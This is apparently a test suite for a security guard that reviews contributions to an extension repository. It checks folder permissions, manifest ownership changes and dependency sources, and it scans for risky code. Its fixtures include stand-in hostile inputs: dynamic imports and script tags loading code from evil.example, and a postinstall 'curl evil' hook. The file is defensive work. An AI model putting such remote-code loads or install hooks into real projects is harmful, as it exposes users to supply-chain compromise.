import { afterAll, describe, expect, test } from 'bun:test'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { folderProblems, manifestChanges, scanFolder, scanText } from './guard.mjs'

const sandbox = mkdtempSync(join(tmpdir(), 'guard-'))
afterAll(() => rmSync(sandbox, { recursive: true, force: true }))

function extensionFolder(files) {
  const folder = mkdtempSync(join(sandbox, 'ext-'))
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(join(folder, path, '..'), { recursive: true })
    writeFileSync(join(folder, path), content)
  }
  return folder
}

const manifest = (odyn, extra = {}) => ({ name: 'x', version: '1.0.0', private: true, odyn: { id: 'x', permissions: [], owners: ['jane'], ...odyn }, ...extra })

describe('folderProblems', () => {
  const change = (filename) => ({ status: 'modified', filename, previous: null })

  test('an outsider may change one extension folder', () => {
    expect(folderProblems([change('extensions/weather/src/index.ts')], { maintainer: false }).problems).toEqual([])
  })

  test('an outsider may not touch the repo’s own files or a second extension', () => {
    const { problems } = folderProblems([change('extensions/weather/package.json'), change('.github/workflows/release.yml'), change('extensions/phones/src/helper.ts')], { maintainer: false })
    expect(problems).toHaveLength(2)
  })

  test('a rename counts its old name too', () => {
    const { problems } = folderProblems([{ status: 'renamed', filename: 'extensions/weather/a.ts', previous: 'scripts/build.mjs' }], { maintainer: false })
    expect(problems).toHaveLength(1)
  })

  test('maintainers get a note instead of a failure', () => {
    const result = folderProblems([change('scripts/build.mjs')], { maintainer: true })
    expect(result.problems).toEqual([])
    expect(result.notes).toHaveLength(1)
  })
})

describe('scanText', () => {
  test('fails eval, new Function, remote code and minified lines', () => {
    expect(scanText('a.ts', 'eval(x)').problems).toHaveLength(1)
    expect(scanText('a.ts', 'const f = new Function("x")').problems).toHaveLength(1)
    expect(scanText('a.ts', "await import('https://evil.example/x.js')").problems).toHaveLength(1)
    expect(scanText('a.html', '<script src="https://evil.example/x.js"></script>').problems).toHaveLength(1)
    expect(scanText('a.ts', `const x = 1;${' '.repeat(1200)}`).problems).toHaveLength(1)
  })

  test('only warns about encoded text', () => {
    const result = scanText('a.ts', `const data = "${'QUJD'.repeat(60)}"; atob(data)`)
    expect(result.problems).toEqual([])
    expect(result.warnings).toHaveLength(2)
  })

  test('ordinary code passes', () => {
    expect(scanText('a.ts', "import { defineExtension } from '@odyn-app/api'\nconst evaluate = 1").problems).toEqual([])
  })
})

describe('scanFolder', () => {
  test('fails compiled files, binaries, committed builds and links', () => {
    const folder = extensionFolder({ 'native.node': 'x', 'blob.dat': Buffer.from([1, 0, 2]), 'dist/index.js': 'x', 'src/index.ts': 'ok' })
    symlinkSync('/etc/hosts', join(folder, 'hosts'))
    expect(scanFolder(folder).problems).toHaveLength(4)
  })

  test('a normal extension passes', () => {
    const folder = extensionFolder({ 'package.json': '{}', 'src/index.ts': 'export {}', 'icon.png': Buffer.from([137, 80, 0, 71]) })
    expect(scanFolder(folder).problems).toEqual([])
  })
})

describe('manifestChanges', () => {
  test('reports new permissions and hosts', () => {
    const { facts } = manifestChanges(manifest({}), manifest({ permissions: ['network'], allowedHosts: ['api.example.com'] }, { version: '1.1.0' }), { author: 'jane', maintainer: false })
    expect(facts.join(' ')).toContain('network')
    expect(facts.join(' ')).toContain('api.example.com')
  })

  test('only an owner can change the owners', () => {
    const takeover = manifest({ owners: ['mallory'] })
    expect(manifestChanges(manifest({}), takeover, { author: 'mallory', maintainer: false }).problems).toHaveLength(1)
    expect(manifestChanges(manifest({}), manifest({ owners: ['jane', 'sam'] }), { author: 'jane', maintainer: false }).problems).toEqual([])
  })

  test('fails install scripts and packages from outside npm', () => {
    const after = manifest({}, { scripts: { postinstall: 'curl evil' }, dependencies: { a: 'github:evil/a', b: 'file:../b', c: '^1.2.0' } })
    const result = manifestChanges(manifest({}), after, { author: 'jane', maintainer: false })
    expect(result.problems).toHaveLength(3)
    expect(result.newDependencies.map(([name]) => name)).toEqual(['c'])
  })
})
